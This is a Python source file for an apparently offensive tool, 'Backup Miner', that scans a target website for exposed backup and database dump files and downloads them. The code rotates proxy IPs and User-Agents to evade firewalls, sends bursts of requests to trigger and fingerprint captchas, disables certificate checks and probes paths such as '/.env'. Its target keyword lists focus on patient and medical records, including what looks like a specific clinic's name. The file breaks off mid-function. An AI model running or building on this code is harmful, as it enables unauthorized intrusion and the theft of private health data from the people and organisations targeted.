#!/usr/bin/env python3
"""
Backup Miner v2.0 (Enhanced) - 智能化备份文件挖掘器
稳定高效！自动发现并下载各种备份文件，一锅端所有历史数据
新增：智能过滤、技术栈检测、时间轴推测、深度分析
"""

import asyncio
import aiohttp
import os
import re
import hashlib
import logging
import sys
import base64
import gzip
import bz2
import zipfile
import tarfile
import uuid
from datetime import datetime, timedelta
from urllib.parse import urljoin, urlparse, quote
import ssl
import certifi
import json
import difflib

# 导入噪音过滤器 - 防止备份挖掘中的第三方噪音
NOISE_FILTER_AVAILABLE = False
try:
    # 尝试相对导入（作为模块运行时）
    from .third_party_blacklist import (
        smart_filter,
        is_third_party,
        has_security_value,
        analyze_noise_level,
        filter_third_party_urls
    )
    NOISE_FILTER_AVAILABLE = True
    print(" 噪音过滤器已加载 - 防止备份挖掘傻逼兴奋")
except ImportError:
    try:
        # 尝试绝对导入（直接执行脚本时）
        from third_party_blacklist import (
            smart_filter,
            is_third_party,
            has_security_value,
            analyze_noise_level,
            filter_third_party_urls
        )
        NOISE_FILTER_AVAILABLE = True
        print(" 噪音过滤器已加载 - 防止备份挖掘傻逼兴奋")
    except ImportError:
        try:
            # 尝试从当前目录导入
            import sys
            import os
            sys.path.append(os.path.dirname(os.path.abspath(__file__)))
            from third_party_blacklist import (
                smart_filter,
                is_third_party,
                has_security_value,
                analyze_noise_level,
                filter_third_party_urls
            )
            NOISE_FILTER_AVAILABLE = True
            print(" 噪音过滤器已加载 - 防止备份挖掘傻逼兴奋")
        except ImportError:
            print("  警告: 噪音过滤器不可用，可能会有大量第三方备份噪音")

# 导入动态IP池 - 500个IP轮换
DYNAMIC_IP_AVAILABLE = False
try:
    # 尝试相对导入（作为模块运行时）
    from .dynamic_ip_pool import init_ip_pool, get_proxy_session, get_ip_stats, force_switch_ip, _global_ip_pool
    DYNAMIC_IP_AVAILABLE = True
    print(" 动态IP池已加载 - 500个IP轮换挖掘")
except ImportError:
    try:
        # 尝试绝对导入（直接执行脚本时）
        from dynamic_ip_pool import init_ip_pool, get_proxy_session, get_ip_stats, force_switch_ip, _global_ip_pool
        DYNAMIC_IP_AVAILABLE = True
        print(" 动态IP池已加载 - 500个IP轮换挖掘")
    except ImportError:
        try:
            # 尝试从当前目录导入
            import sys
            import os
            sys.path.append(os.path.dirname(os.path.abspath(__file__)))
            from dynamic_ip_pool import init_ip_pool, get_proxy_session, get_ip_stats, force_switch_ip, _global_ip_pool
            DYNAMIC_IP_AVAILABLE = True
            print(" 动态IP池已加载 - 500个IP轮换挖掘")
        except ImportError:
            print("  警告: 动态IP池不可用，将使用常规请求")

# 导入User-Agent管理器
USER_AGENT_AVAILABLE = False
try:
    # 尝试相对导入（作为模块运行时）
    from .user_agent_manager import UserAgentManager, get_user_agent_manager
    USER_AGENT_AVAILABLE = True
    print(" User-Agent管理器已加载 - 智能伪装挖掘")
except ImportError:
    try:
        # 尝试绝对导入（直接执行脚本时）
        from user_agent_manager import UserAgentManager, get_user_agent_manager
        USER_AGENT_AVAILABLE = True
        print(" User-Agent管理器已加载 - 智能伪装挖掘")
    except ImportError:
        try:
            # 尝试从当前目录导入
            import sys
            import os
            sys.path.append(os.path.dirname(os.path.abspath(__file__)))
            from user_agent_manager import UserAgentManager, get_user_agent_manager
            USER_AGENT_AVAILABLE = True
            print(" User-Agent管理器已加载 - 智能伪装挖掘")
        except ImportError:
            print("  警告: User-Agent管理器不可用，将使用基础请求头")

# 导入认证管理器 - 访问认证后的备份金矿
try:
    from .auth_manager import AuthenticationManager, AuthConfig, create_auth_manager
    AUTH_MANAGER_AVAILABLE = True
    print("认证 认证管理器已加载 - 可访问认证后备份金矿")
except ImportError:
    AUTH_MANAGER_AVAILABLE = False
    print("   警告: 认证管理器不可用 - 无法访问认证后备份")


class SmartRateController:
    """智能速率控制器 - 自适应并发和延迟控制"""
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.target_domain = urlparse(target_url).netloc
        
        # 响应时间统计
        self.response_times = []
        self.max_response_time_samples = 50
        
        # 错误率统计
        self.total_requests = 0
        self.failed_requests = 0
        self.consecutive_failures = 0
        self.max_consecutive_failures = 5
        
        # 动态并发控制
        self.current_concurrency = 2  # 保守起始值
        self.min_concurrency = 1
        self.max_concurrency = 15  # 降低最大值
        self.concurrency_adjustment_threshold = 10  # 每10个请求评估一次
        
        # 智能延迟控制
        self.base_delay = 0.1  # 基础延迟100ms
        self.current_delay = 0.1
        self.max_delay = 5.0  # 最大延迟5秒
        self.delay_multiplier = 1.5
        
        # 服务器健康状态
        self.server_health = 'unknown'  # unknown, healthy, stressed, overloaded
        self.last_health_check = 0
        self.health_check_interval = 30  # 30秒检查一次
        
        # 速率限制检测
        self.rate_limit_detected = False
        self.rate_limit_status_codes = [429, 503, 502, 504]
        
        # 时间窗口统计
        self.request_window = []
        self.window_size = 60  # 60秒窗口
        self.max_requests_per_minute = 120  # 每分钟最多120请求
        
        print(f"    智能速率控制器已初始化 (目标: {self.target_domain})")
        print(f"    初始并发: {self.current_concurrency}, 基础延迟: {self.base_delay}s")

    async def acquire_request_slot(self):
        """获取请求槽位 - 智能控制请求速率"""
        # 检查时间窗口限制
        await self._check_rate_window()
        
        # 检查服务器健康状态
        await self._check_server_health()
        
        # 应用智能延迟
        if self.current_delay > 0:
            await asyncio.sleep(self.current_delay)
        
        # 记录请求时间
        self.request_window.append(datetime.now().timestamp())
        
        return True

    async def record_response(self, response_time, status_code, success=True):
        """记录响应结果并调整策略"""
        self.total_requests += 1
        
        # 记录响应时间
        if response_time > 0:
            self.response_times.append(response_time)
            if len(self.response_times) > self.max_response_time_samples:
                self.response_times.pop(0)
        
        # 记录成功/失败
        if success and status_code < 400:
            self.consecutive_failures = 0
            # 检测速率限制解除
            if self.rate_limit_detected and status_code not in self.rate_limit_status_codes:
                self.rate_limit_detected = False
                print(f"    速率限制已解除，恢复正常请求")
        else:
            self.failed_requests += 1
            self.consecutive_failures += 1
            
            # 检测速率限制
            if status_code in self.rate_limit_status_codes:
                self.rate_limit_detected = True
                print(f"    检测到速率限制 (HTTP {status_code})，调整请求速率")
        
        # 每隔一定请求数调整策略
        if self.total_requests % self.concurrency_adjustment_threshold == 0:
            await self._adjust_strategy()

    async def get_optimal_semaphore(self):
        """获取当前最优并发信号量"""
        if self.rate_limit_detected:
            # 速率限制时大幅降低并发
            optimal_concurrency = max(1, self.current_concurrency // 3)
        elif self.consecutive_failures > self.max_consecutive_failures:
            # 连续失败时降低并发
            optimal_concurrency = max(1, self.current_concurrency // 2)
        else:
            optimal_concurrency = self.current_concurrency
        
        return asyncio.Semaphore(optimal_concurrency)

    async def _check_rate_window(self):
        """检查时间窗口内的请求频率"""
        now = datetime.now().timestamp()
        
        # 清理过期的请求记录
        self.request_window = [ts for ts in self.request_window if now - ts < self.window_size]
        
        # 如果请求过于频繁，等待
        if len(self.request_window) >= self.max_requests_per_minute:
            wait_time = self.window_size - (now - self.request_window[0])
            if wait_time > 0:
                print(f"    请求频率限制，等待 {wait_time:.1f} 秒...")
                await asyncio.sleep(wait_time)

    async def _check_server_health(self):
        """检查服务器健康状态"""
        now = datetime.now().timestamp()
        
        if now - self.last_health_check > self.health_check_interval:
            self.last_health_check = now
            
            # 基于响应时间和错误率评估健康状态
            if self.response_times:
                avg_response_time = sum(self.response_times) / len(self.response_times)
                error_rate = self.failed_requests / max(1, self.total_requests)
                
                if error_rate > 0.2 or avg_response_time > 10:
                    self.server_health = 'overloaded'
                elif error_rate > 0.1 or avg_response_time > 5:
                    self.server_health = 'stressed'
                elif error_rate < 0.05 and avg_response_time < 2:
                    self.server_health = 'healthy'
                else:
                    self.server_health = 'normal'
                
                print(f"    服务器健康状态: {self.server_health} "
                      f"(响应时间: {avg_response_time:.2f}s, 错误率: {error_rate:.1%})")

    async def _adjust_strategy(self):
        """根据服务器状态调整请求策略"""
        if not self.response_times:
            return
        
        avg_response_time = sum(self.response_times) / len(self.response_times)
        error_rate = self.failed_requests / max(1, self.total_requests)
        
        # 动态调整并发数
        if self.rate_limit_detected or self.server_health == 'overloaded':
            # 服务器过载，大幅降低并发和增加延迟
            self.current_concurrency = max(self.min_concurrency, self.current_concurrency - 2)
            self.current_delay = min(self.max_delay, self.current_delay * self.delay_multiplier)
            
        elif self.server_health == 'stressed':
            # 服务器有压力，适度降低并发
            self.current_concurrency = max(self.min_concurrency, self.current_concurrency - 1)
            self.current_delay = min(self.max_delay, self.current_delay * 1.2)
            
        elif self.server_health == 'healthy' and error_rate < 0.05:
            # 服务器健康，可以适度增加并发
            if avg_response_time < 2 and self.consecutive_failures == 0:
                self.current_concurrency = min(self.max_concurrency, self.current_concurrency + 1)
                self.current_delay = max(self.base_delay, self.current_delay * 0.9)
        
        # 确保参数在合理范围内
        self.current_concurrency = max(self.min_concurrency, min(self.max_concurrency, self.current_concurrency))
        self.current_delay = max(self.base_delay, min(self.max_delay, self.current_delay))
        
        print(f"    策略调整: 并发={self.current_concurrency}, 延迟={self.current_delay:.2f}s, "
              f"健康状态={self.server_health}")

    def get_stats(self):
        """获取速率控制统计信息"""
        return {
            'current_concurrency': self.current_concurrency,
            'current_delay': self.current_delay,
            'server_health': self.server_health,
            'total_requests': self.total_requests,
            'error_rate': self.failed_requests / max(1, self.total_requests),
            'avg_response_time': sum(self.response_times) / len(self.response_times) if self.response_times else 0,
            'rate_limit_detected': self.rate_limit_detected
        }


class BaselineDetector:
    """基线探测器 - 建立目标独特的"身份指纹"以识别WAF欺骗"""
    
    def __init__(self, target_url):
        self.target_url = target_url
        self.target_domain = urlparse(target_url).netloc
        
        # 基线指纹库
        self.baselines = {
            'standard_404': {
                'content_hash': None,
                'content_length': 0,
                'keywords': [],
                'similarity_threshold': 0.95
            },
            'standard_403': {
                'content_hash': None,
                'content_length': 0,
                'keywords': [],
                'similarity_threshold': 0.95
            },
            'captcha_verification': {
                'content_hash': None,
                'content_length': 0,
                'keywords': [],
                'similarity_threshold': 0.90
            }
        }
        
        # 检测关键词库
        self.detection_keywords = {
            '404_keywords': [
                'not found', '页面不存在', 'ページが見つかりません', 'page not found',
                '404', 'file not found', 'resource not found', '找不到页面',
                'no such file', 'does not exist', '存在しません'
            ],
            '403_keywords': [
                'forbidden', 'access denied', 'permission denied', 'unauthorized',
                '403', 'access forbidden', 'アクセス拒否', '访问被拒绝',
                'insufficient privileges', 'you don\'t have permission'
            ],
            'captcha_keywords': [
                'captcha', 'are you human', 'verification', 'robot', 'automated',
                '验证码', '人机验证', 'ロボット検証', 'please verify',
                'security check', 'cloudflare', 'ddos protection', '安全验证'
            ]
        }
        
        self.baseline_established = False
        print(f"    基线探测器已初始化 (目标: {self.target_domain})")

    async def establish_baselines(self, session):
        """建立基线指纹库"""
        print("[+] 建立WAF欺骗检测基线...")
        
        try:
            # 1. 获取标准404基线
            await self._get_404_baseline(session)
            
            # 2. 获取标准403基线
            await self._get_403_baseline(session)
            
            # 3. 尝试获取验证码基线
            await self._get_captcha_baseline(session)
            
            self.baseline_established = True
            print(f"    基线建立完成！")
            
        except Exception as e:
            print(f"    基线建立失败: {e}")
            # 即使失败也标记为已建立，避免重复尝试
            self.baseline_established = True

    async def _get_404_baseline(self, session):
        """获取标准404页面基线"""
        # 生成一个绝对不存在的随机路径
        random_path = f"/{uuid.uuid4().hex}.backup.nonexistent"
        url = urljoin(self.target_url, random_path)
        
        try:
            async with session.get(url, timeout=10) as resp:
                content = await resp.text()
                
                # 计算内容特征
                content_hash = hashlib.sha256(content.encode('utf-8', errors='ignore')).hexdigest()
                content_length = len(content)
                
                # 检测404关键词
                keywords_found = []
                content_lower = content.lower()
                for keyword in self.detection_keywords['404_keywords']:
                    if keyword in content_lower:
                        keywords_found.append(keyword)
                
                self.baselines['standard_404'] = {
                    'content_hash': content_hash,
                    'content_length': content_length,
                    'keywords': keywords_found,
                    'similarity_threshold': 0.95,
                    'status_code': resp.status
                }
                
                print(f"      404基线: 状态码{resp.status}, 长度{content_length}, 关键词{len(keywords_found)}个")
                
        except Exception as e:
            print(f"      404基线获取失败: {e}")

    async def _get_403_baseline(self, session):
        """获取标准403/访问拒绝页面基线"""
        # 尝试访问通常被禁止的路径
        forbidden_paths = ['/admin/', '/etc/', '/root/', '/.env', '/wp-admin/']
        
        for path in forbidden_paths:
            try:
                url = urljoin(self.target_url, path)
                async with session.get(url, timeout=10) as resp:
                    if resp.status in [403, 401]:
                        content = await resp.text()
                        
                        # 计算内容特征
                        content_hash = hashlib.sha256(content.encode('utf-8', errors='ignore')).hexdigest()
                        content_length = len(content)
                        
                        # 检测403关键词
                        keywords_found = []
                        content_lower = content.lower()
                        for keyword in self.detection_keywords['403_keywords']:
                            if keyword in content_lower:
                                keywords_found.append(keyword)
                        
                        self.baselines['standard_403'] = {
                            'content_hash': content_hash,
                            'content_length': content_length,
                            'keywords': keywords_found,
                            'similarity_threshold': 0.95,
                            'status_code': resp.status,
                            'trigger_path': path
                        }
                        
                        print(f"      403基线: 状态码{resp.status}, 长度{content_length}, 触发路径{path}")
                        break
                        
            except Exception:
                continue

    async def _get_captcha_baseline(self, session):
        """尝试获取验证码/人机验证页面基线"""
        # 通过短时间高频请求尝试触发验证码
        trigger_paths = ['/login', '/api/login', '/admin', '/wp-login.php']
        
        for path in trigger_paths:
            try:
                url = urljoin(self.target_url, path)
                
                # 短时间内发送5个请求尝试触发
                for _ in range(5):
                    async with session.get(url, timeout=5) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            content_lower = content.lower()
                            
                            # 检查是否包含验证码相关内容
                            captcha_keywords_found = []
                            for keyword in self.detection_keywords['captcha_keywords']:
                                if keyword in content_lower:
                                    captcha_keywords_found.append(keyword)
                            
                            # 如果找到验证码关键词，建立基线
                            if captcha_keywords_found:
                                content_hash = hashlib.sha256(content.encode('utf-8', errors='ignore')).hexdigest()
                                content_length = len(content)
                                
                                self.baselines['captcha_verification'] = {
                                    'content_hash': content_hash,
                                    'content_length': content_length,
                                    'keywords': captcha_keywords_found,
                                    'similarity_threshold': 0.90,
                                    'trigger_path': path
                                }
                                
                                print(f"      验证码基线: 长度{content_length}, 关键词{len(captcha_keywords_found)}个")
                                return
                    
                    # 短暂延迟
                    await asyncio.sleep(0.2)
                    
            except Exception:
                continue

    def get_baseline_info(self):
        """获取基线信息摘要"""
        info = {
            'established': self.baseline_established,
            'baselines_count': 0,
            'detection_capabilities': []
        }
        
        for baseline_type, baseline_data in self.baselines.items():
            if baseline_data['content_hash']:
                info['baselines_count'] += 1
                info['detection_capabilities'].append(baseline_type)
        
        return info


class DeceptionDetector:
    """实时欺骗检测器 - 识别WAF的"软"限制策略"""
    
    def __init__(self, baseline_detector):
        self.baseline_detector = baseline_detector
        self.detection_stats = {
            'total_analyzed': 0,
            'soft_404_detected': 0,
            'fake_403_detected': 0,
            'captcha_detected': 0,
            'legitimate_responses': 0
        }
        
    async def analyze_response(self, url, status_code, content, headers):
        """分析响应是否为WAF欺骗"""
        self.detection_stats['total_analyzed'] += 1
        
        # 只分析状态码为200的响应（欺骗检测的重点）
        if status_code != 200:
            return False, "non_200_status"
        
        if not self.baseline_detector.baseline_established:
            return False, "baseline_not_established"
        
        try:
            # 计算响应内容特征
            content_hash = hashlib.sha256(content.encode('utf-8', errors='ignore')).hexdigest()
            content_length = len(content)
            content_lower = content.lower()
            
            # 1. 检测软404 (Soft 404)
            is_soft_404, soft_404_reason = self._detect_soft_404(content_hash, content_length, content_lower)
            if is_soft_404:
                self.detection_stats['soft_404_detected'] += 1
                return True, f"soft_404: {soft_404_reason}"
            
            # 2. 检测伪装的403拒绝
            is_fake_403, fake_403_reason = self._detect_fake_403(content_hash, content_length, content_lower)
            if is_fake_403:
                self.detection_stats['fake_403_detected'] += 1
                return True, f"fake_403: {fake_403_reason}"
            
            # 3. 检测验证码/人机验证
            is_captcha, captcha_reason = self._detect_captcha_verification(content_hash, content_length, content_lower)
            if is_captcha:
                self.detection_stats['captcha_detected'] += 1
                return True, f"captcha: {captcha_reason}"
            
            # 4. 检测其他欺骗模式
            is_other_deception, other_reason = self._detect_other_deceptions(content, headers)
            if is_other_deception:
                return True, f"other_deception: {other_reason}"
            
            # 如果都没检测到，认为是正常响应
            self.detection_stats['legitimate_responses'] += 1
            return False, "legitimate_response"
            
        except Exception as e:
            return False, f"analysis_error: {e}"

    def _detect_soft_404(self, content_hash, content_length, content_lower):
        """检测软404"""
        baseline_404 = self.baseline_detector.baselines['standard_404']
        
        if not baseline_404['content_hash']:
            return False, "no_baseline"
        
        # 1. 哈希完全匹配
        if content_hash == baseline_404['content_hash']:
            return True, "exact_hash_match"
        
        # 2. 长度几乎相同 + 关键词匹配
        length_diff = abs(content_length - baseline_404['content_length'])
        if length_diff < 100:  # 长度差异小于100字节
            # 检查404关键词
            for keyword in baseline_404['keywords']:
                if keyword in content_lower:
                    return True, f"length_similarity_and_keyword: {keyword}"
        
        # 3. 关键词密集匹配
        matched_keywords = 0
        for keyword in self.baseline_detector.detection_keywords['404_keywords']:
            if keyword in content_lower:
                matched_keywords += 1
        
        if matched_keywords >= 2:  # 匹配2个或以上404关键词
            return True, f"multiple_404_keywords: {matched_keywords}"
        
        return False, "not_soft_404"

    def _detect_fake_403(self, content_hash, content_length, content_lower):
        """检测伪装的403拒绝"""
        baseline_403 = self.baseline_detector.baselines['standard_403']
        
        if not baseline_403['content_hash']:
            return False, "no_baseline"
        
        # 1. 哈希完全匹配
        if content_hash == baseline_403['content_hash']:
            return True, "exact_hash_match"
        
        # 2. 长度相似 + 关键词匹配
        length_diff = abs(content_length - baseline_403['content_length'])
        if length_diff < 50:  # 403页面通常更短，容差更小
            for keyword in baseline_403['keywords']:
                if keyword in content_lower:
                    return True, f"length_similarity_and_keyword: {keyword}"
        
        # 3. 403关键词检测
        matched_keywords = 0
        for keyword in self.baseline_detector.detection_keywords['403_keywords']:
            if keyword in content_lower:
                matched_keywords += 1
        
        if matched_keywords >= 2:
            return True, f"multiple_403_keywords: {matched_keywords}"
        
        return False, "not_fake_403"

    def _detect_captcha_verification(self, content_hash, content_length, content_lower):
        """检测验证码/人机验证"""
        baseline_captcha = self.baseline_detector.baselines['captcha_verification']
        
        # 1. 如果有基线，进行哈希匹配
        if baseline_captcha['content_hash']:
            if content_hash == baseline_captcha['content_hash']:
                return True, "exact_hash_match"
        
        # 2. 验证码关键词检测（即使没有基线也能检测）
        matched_keywords = []
        for keyword in self.baseline_detector.detection_keywords['captcha_keywords']:
            if keyword in content_lower:
                matched_keywords.append(keyword)
        
        if len(matched_keywords) >= 1:  # 只要有一个验证码关键词就认为是验证码页面
            return True, f"captcha_keywords: {', '.join(matched_keywords)}"
        
        # 3. 特殊模式检测（空响应、固定大小JSON等）
        if content_length < 50:  # 内容过短
            return True, "suspiciously_short_content"
        
        # 检测固定大小的JSON响应（常见的WAF策略）
        if content_lower.strip() in ['{}', '{"status":"ok"}', '{"result":"success"}', '[]']:
            return True, "fixed_size_json_response"
        
        return False, "not_captcha"

    def _detect_other_deceptions(self, content, headers):
        """检测其他欺骗模式"""
        content_lower = content.lower()
        
        # 1. 检测空响应或几乎空的响应
        if len(content.strip()) < 10:
            return True, "empty_or_minimal_content"
        
        # 2. 检测可疑的重定向指示
        redirect_indicators = ['window.location', 'meta http-equiv="refresh"', 'location.href']
        for indicator in redirect_indicators:
            if indicator in content_lower:
                return True, f"suspicious_redirect: {indicator}"
        
        # 3. 检测WAF厂商特征
        waf_indicators = ['cloudflare', 'incapsula', 'akamai', 'imperva', 'f5', 'barracuda']
        for waf in waf_indicators:
            if waf in content_lower or waf in str(headers).lower():
                return True, f"waf_signature: {waf}"
        
        return False, "no_other_deception"

    def get_detection_stats(self):
        """获取检测统计信息"""
        if self.detection_stats['total_analyzed'] > 0:
            self.detection_stats['deception_rate'] = (
                (self.detection_stats['soft_404_detected'] + 
                 self.detection_stats['fake_403_detected'] + 
                 self.detection_stats['captcha_detected']) / 
                self.detection_stats['total_analyzed']
            )
        else:
            self.detection_stats['deception_rate'] = 0
        
        return self.detection_stats.copy()


class RequestBypassEnhancer:
    """请求绕过增强器 - 专门用于绕过WAF和检测系统（备份挖掘版）"""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.current_ua = None
        self.current_headers = {}
        self.request_count = 0
        self.bypass_stats = {
            'ua_rotations': 0,
            'header_variations': 0,
            'requests_made': 0,
            'detected_blocks': 0
        }
        
        # 初始化User-Agent管理器
        if USER_AGENT_AVAILABLE:
            self.ua_manager = get_user_agent_manager()
        else:
            self.ua_manager = None
    
    def rotate_user_agent(self):
        """轮换User-Agent"""
        if self.ua_manager:
            self.current_ua = self.ua_manager.rotate_user_agent()
        else:
            self.current_ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
        self.bypass_stats['ua_rotations'] += 1
        return self.current_ua
    
    def generate_realistic_headers(self):
        """生成逼真的HTTP请求头"""
        if self.ua_manager:
            headers = self.ua_manager.generate_realistic_headers(self.target_url, force_rotate=True)
            self.current_ua = headers.get('User-Agent')
        else:
            # 基础回退头（适合备份挖掘）
            headers = {
                'User-Agent': self.current_ua or self.rotate_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Pragma': 'no-cache',
            }
        
        self.current_headers = headers
        self.bypass_stats['header_variations'] += 1
        return headers
    
    async def create_enhanced_session(self):
        """创建增强会话（基础User-Agent模式）"""
        headers = self.generate_realistic_headers()
        
        # SSL配置（忽略证书错误，适合备份挖掘）
        ssl_context = ssl.create_default_context(cafile=certifi.where())
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        connector = aiohttp.TCPConnector(
            ssl=ssl_context,
            limit=100,
            ttl_dns_cache=300,
            use_dns_cache=True,
        )
        
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        
        return aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers
        )


class BackupMiner:
    def __init__(self, target_url, auth_config=None):
        self.target_url = target_url.rstrip('/')
        self.found_backups = []
        self.downloaded_files = []
        self.extracted_data = []
        self.output_dir = f"backup_miner_{urlparse(target_url).netloc.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        # 认证管理器配置
        self.auth_manager = None
        self.auth_config = auth_config
        if AUTH_MANAGER_AVAILABLE and auth_config:
            try:
                if isinstance(auth_config, dict):
                    auth_config = AuthConfig(**auth_config)
                self.auth_manager = AuthenticationManager(auth_config)
                print("认证 认证管理器初始化成功 - 准备访问认证后备份")
            except Exception as e:
                print(f"   认证管理器初始化失败: {e}")
        
        # 绕过增强器配置
        self.bypass_enhancer = RequestBypassEnhancer(target_url)
        self.use_dynamic_ip = DYNAMIC_IP_AVAILABLE
        self.use_user_agent = USER_AGENT_AVAILABLE
        self.dynamic_ip_initialized = False
        
        # 统一session管理
        self.session = None
        
        # 技术栈检测结果（用于智能模式生成）
        self.detected_tech_stack = {
            'language': 'unknown',     # php, java, python, nodejs, .net
            'framework': 'unknown',    # laravel, spring, django, express
            'database': 'unknown',     # mysql, postgres, mongodb, redis
            'cms': 'unknown',          # wordpress, drupal, joomla
            'web_server': 'unknown',   # apache, nginx, iis
            'cloud_provider': 'unknown', # aws, azure, gcp, cdn
            'container': 'unknown',    # docker, k8s
            'country': 'unknown'       # jp, cn, us, eu
        }
        
        # 噪音过滤统计
        self.noise_stats = {
            'total_backups_found': 0,
            'noise_filtered': 0,
            'valuable_backups': 0,
            'false_positives': 0,
            'third_party_filtered': 0
        }
        
        # 智能时间轴推测
        self.time_intelligence = {
            'domain_creation_date': None,
            'ssl_cert_dates': [],
            'backup_frequency_pattern': 'unknown',
            'peak_backup_times': [],
            'seasonal_patterns': []
        }
        
        # 备份文件模式（将动态生成）
        self.backup_patterns = []
        self.intelligent_patterns = []
        self.pattern_generation_completed = False
        
        # 常见备份目录（增强版）
        self.backup_dirs = [
            # 基础目录
            '/', '/backup/', '/backups/', '/bak/', '/old/', '/temp/', '/tmp/',
            '/dump/', '/dumps/', '/export/', '/exports/', '/download/', '/downloads/',
            '/archive/', '/archives/', '/save/', '/saved/', '/db/', '/database/',
            '/sql/', '/mysql/', '/data/', '/files/', '/upload/', '/uploads/',
            
            # 隐藏目录
            '/_backup/', '/.backup/', '/~backup/', '/backup_files/',
            '/.well-known/backup/', '/assets/backup/', '/static/backup/',
            
            # 管理目录
            '/admin/backup/', '/admin/export/', '/admin/dump/',
            '/management/backup/', '/manager/backup/', '/control/backup/',
            
            # 系统目录
            '/var/backup/', '/var/dump/', '/var/export/',
            '/home/backup/', '/root/backup/', '/opt/backup/',
            '/www/backup/', '/web/backup/', '/site/backup/',
            
            # 访问控制目录
            '/public/backup/', '/private/backup/', '/secure/backup/',
            '/protected/backup/', '/restricted/backup/',
            
            # 框架特定目录
            '/wp-content/backup/', '/wp-admin/backup/',  # WordPress
            '/sites/default/files/backup/',              # Drupal
            '/app/backup/', '/storage/backup/',          # Laravel
            '/media/backup/', '/static/backup/',         # Django
            
            # 多语言目录
            '/バックアップ/', '/保存/', '/データ/', '/ダンプ/',  # 日文
            '/备份/', '/数据/', '/导出/', '/存档/',              # 中文
            '/sauvegardes/', '/donnees/', '/archives/',    # 法文
            '/respaldos/', '/datos/', '/archivos/'         # 西班牙文
        ]
        
        # 数据库备份关键词（增强版）
        self.db_keywords = [
            # 医疗相关
            'patient', 'medical', 'health', 'clinic', 'hospital', 'doctor',
            'appointment', 'prescription', 'record', 'diagnosis', 'treatment',
            'asanoha', 'dental', 'pharmacy', 'laboratory',
            
            # 用户数据
            'user', 'member', 'account', 'profile', 'customer', 'client',
            'employee', 'staff', 'admin', 'login', 'auth',
            
            # 数据库类型
            'database', 'mysql', 'postgres', 'mongodb', 'redis', 'sqlite',
            'oracle', 'mssql', 'mariadb', 'cassandra', 'elasticsearch',
            
            # 多语言关键词
            '患者', '診療', '予約', 'カルテ', '薬', '病院', '医師',      # 日文
            '病人', '诊疗', '预约', '病历', '药品', '医院', '医生',      # 中文
            'paciente', 'clinica', 'hospital', 'medico',            # 西班牙文
            'patient', 'clinique', 'hopital', 'medecin'             # 法文
        ]
        
        # 性能和下载统计
        self.download_stats = {
            'total_requests': 0,
            'successful_downloads': 0,
            'failed_downloads': 0,
            'bytes_downloaded': 0,
            'avg_download_speed': 0,
            'concurrent_downloads': 5  # 默认并发数
        }
        
        # 智能速率控制器
        self.rate_controller = SmartRateController(target_url)
        
        # WAF欺骗检测系统
        self.baseline_detector = BaselineDetector(target_url)
        self.deception_detector = DeceptionDetector(self.baseline_detector)

    async def detect_tech_stack(self):
        """检测目标技术栈 - 用于智能模式生成"""
        print("[+] 检测技术栈...")
        
        # 使用系统代理设置
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(self.target_url, timeout=15) as resp:
                    headers = dict(resp.headers)
                    content = await resp.text()
                    
                    # 检测编程语言
                    if 'X-Powered-By' in headers:
                        powered_by = headers['X-Powered-By'].lower()
                        if 'php' in powered_by:
                            self.detected_tech_stack['language'] = 'php'
                        elif 'asp.net' in powered_by:
                            self.detected_tech_stack['language'] = '.net'
                    
                    # 检测Web服务器
                    server = headers.get('Server', '').lower()
                    if 'nginx' in server:
                        self.detected_tech_stack['web_server'] = 'nginx'
                    elif 'apache' in server:
                        self.detected_tech_stack['web_server'] = 'apache'
                    elif 'iis' in server:
                        self.detected_tech_stack['web_server'] = 'iis'
                    
                    # 检测CMS
                    if 'wp-content' in content or 'wordpress' in content.lower():
                        self.detected_tech_stack['cms'] = 'wordpress'
                    elif 'drupal' in content.lower():
                        self.detected_tech_stack['cms'] = 'drupal'
                    elif 'joomla' in content.lower():
                        self.detected_tech_stack['cms'] = 'joomla'
                    
                    # 检测框架特征
                    if 'laravel' in content.lower():
                        self.detected_tech_stack['framework'] = 'laravel'
                    elif 'django' in content.lower():
                        self.detected_tech_stack['framework'] = 'django'
                    elif 'spring' in content.lower():
                        self.detected_tech_stack['framework'] = 'spring'
                    
                    # 检测国家/语言特征
                    if any(char in content for char in ['診療', '患者', '予約', 'レポート']):
                        self.detected_tech_stack['country'] = 'jp'
                    elif any(char in content for char in ['诊疗', '患者', '预约', '报表']):
                        self.detected_tech_stack['country'] = 'cn'
                    
                    # 检测云服务提供商
                    if 'cloudflare' in headers.get('Server', '').lower():
                        self.detected_tech_stack['cloud_provider'] = 'cloudflare'
                    elif 'amazonaws' in str(resp.url):
                        self.detected_tech_stack['cloud_provider'] = 'aws'
                        
                    print(f"    检测到技术栈: {self.detected_tech_stack}")
                    
            except Exception as e:
                print(f"    技术栈检测失败: {e}")

    def generate_intelligent_patterns(self):
        """基于技术栈和时间轴生成智能化备份模式"""
        if self.pattern_generation_completed:
            return self.intelligent_patterns
            
        print("[+] 生成智能化备份模式...")
        patterns = set()
        
        # 1. 基础名称（增强版）
        base_names = [
            # 通用备份
            'backup', 'bak', 'dump', 'export', 'database', 'db',
            'site', 'www', 'web', 'public_html', 'htdocs', 'html',
            'data', 'files', 'upload', 'full', 'complete', 'archive',
            
            # 医疗相关（多语言）
            'patient', 'patients', 'medical', 'health', 'clinic', 'hospital',
            'asanoha', 'asanoha-clinic', 'asanoha_clinic',
            '患者', '診療', '予約', 'カルテ', '薬',      # 日文
            '病人', '诊疗', '预约', '病历', '药品',      # 中文
            
            # 业务关键词
            'user', 'users', 'member', 'members', 'account', 'accounts',
            'order', 'orders', 'transaction', 'transactions', 'payment',
            'log', 'logs', 'audit', 'session', 'cache'
        ]
        
        # 2. 基于技术栈的专用名称
